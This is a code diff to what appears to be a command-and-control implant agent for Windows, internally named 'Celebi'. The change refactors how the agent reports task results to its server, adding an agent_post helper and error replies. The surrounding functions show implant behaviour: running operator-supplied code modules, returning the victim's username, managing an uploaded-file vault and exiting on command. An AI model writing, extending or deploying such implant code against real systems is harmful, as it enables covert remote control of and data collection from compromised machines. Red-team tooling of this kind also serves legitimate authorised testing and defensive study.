@@ -29,16 +29,20 @@ FARPROC resolve_unloaded(char * mod, char * func) {
 	return KERNEL32$GetProcAddress(hModule, func);
 }
 
+void agent_post(AgentState *state, TaskInfo *task, char *output, char *success) {
+	TaskPostReply reply = { 0 };
+	BOOL result = perform_post(state, task, &reply, output, success);
+	
+	#ifdef CELEBI_DEBUG
+	if (result == TRUE && reply.success == 1) {
+		dprintf("Server acknowledged posted command output.");
+	}
+	#endif
+}
+
 void agent_exit(AgentState *state, TaskInfo *task) {
 	if (task != NULL) {
-		TaskPostReply reply = { 0 };
-		BOOL result = perform_post(state, task, &reply, "", "success");
-		
-		#ifdef CELEBI_DEBUG
-		if (result == TRUE && reply.success == 1) {
-			dprintf("Server acknowledged exit.");
-		}
-		#endif
+		agent_post(state, task, "", "success");
 	}
 
 	HttpDestroy(state->http);
@@ -60,24 +64,19 @@ void agent_getuid(AgentState *state, TaskInfo *task) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Failed to resolve '_builtin_getuid' PICO");
 		#endif
+		
+		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
 		return;
 	}
 	
 	GETUID_PICO entrypoint = (GETUID_PICO) pico.entrypoint;
 	char *username = entrypoint();
 	
-	TaskPostReply reply = { 0 };
 	if (username != NULL) {
-		result = perform_post(state, task, &reply, username, "success");
+		agent_post(state, task, username, "success");
 	} else {
-		result = perform_post(state, task, &reply, "<UNKNOWN>", "success");
+		agent_post(state, task, "<UNKNOWN>", "success");
 	}
-	
-	#ifdef CELEBI_DEBUG
-	if (result == TRUE && reply.success == 1) {
-		dprintf("Server acknowledged getuid output.");
-	}
-	#endif
 	
 	free_resolved_pico(&pico);
 }
@@ -108,19 +107,11 @@ void agent_register(AgentState *state, TaskInfo *task) {
 		add_to_vault(&state->file_vault, name, upload.current_buffer, upload.buflen); 
 	}
 
-	BOOL result;
-	TaskPostReply reply = { 0 };
 	if (upload.error == FALSE) {
-		result = perform_post(state, task, &reply, name, "success"); 
+		agent_post(state, task, name, "success");
 	} else {
-		result = perform_post(state, task, &reply, "upload failed", "error: upload failed");
+		agent_post(state, task, "upload failed", "error: upload failed");
 	}
-	
-	#ifdef CELEBI_DEBUG
-	if (result == TRUE && reply.success == 1) {
-		dprintf("Server acknowledged register output.");
-	}
-	#endif
 	
 	free_upload_manager(&upload);
 }
@@ -138,18 +129,11 @@ void agent_unregister(AgentState *state, TaskInfo *task) {
 	}
 	#endif
 	
-	TaskPostReply reply = { 0 };
 	if (result == TRUE) {
-		result = perform_post(state, task, &reply, "removed from vault", "success"); 
+		agent_post(state, task, "removed from vault", "success"); 
 	} else {
-		result = perform_post(state, task, &reply, "could not remove from vault", "error: removal failed");
+		agent_post(state, task, "could not remove from vault", "error: removal failed");
 	}
-	
-	#ifdef CELEBI_DEBUG
-	if (result == TRUE && reply.success == 1) {
-		dprintf("Server acknowledged unregister output.");
-	}
-	#endif
 }
 
 void agent_execute_pico(AgentState *state, TaskInfo *task) {
@@ -163,6 +147,8 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 		#ifdef CELEBI_DEBUG
 		dprintf("Failed to resolve '%s' PICO", name);
 		#endif
+		
+		agent_post(state, task, "failed to resolve PICO", "error: failed to resolve PICO");
 		return;
 	}
 	
@@ -173,14 +159,7 @@ void agent_execute_pico(AgentState *state, TaskInfo *task) {
 		pico_output = "(no output)";
 	}
 	
-	TaskPostReply reply = { 0 };
-	result = perform_post(state, task, &reply, pico_output, "success");
-	
-	#ifdef CELEBI_DEBUG
-	if (result == TRUE && reply.success == 1) {
-		dprintf("Server acknowledged execute_pico output.");
-	}
-	#endif
+	agent_post(state, task, pico_output, "success");
 	
 	free_resolved_pico(&pico);
 }
